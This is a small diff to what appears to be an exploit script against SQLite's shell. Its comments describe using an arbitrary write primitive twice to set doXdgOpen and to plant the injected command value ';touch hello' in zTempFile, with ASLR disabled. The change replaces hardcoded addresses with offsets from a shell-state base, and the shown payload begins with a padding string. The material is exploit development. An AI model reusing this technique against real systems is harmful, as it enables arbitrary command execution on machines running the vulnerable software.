@@ -25,8 +25,11 @@ The attack needs to set p->doXdgOpen to 1 and p->zTempFile to ";touch hello"
 We leverage the arbitrary write primitive twice
 We disabled ASLR, so the address of p and faked structures are fixed
 '''
-doXdgOpen = 0x7fffffffca46
-zTempFile = 0x7fffffffcad0
+
+shellstate = 0x7fffffffc8b8
+
+doXdgOpen = shellstate + 0xe
+zTempFile = shellstate + 0x98
 
 exp = "0" * 0x800 * 2
 
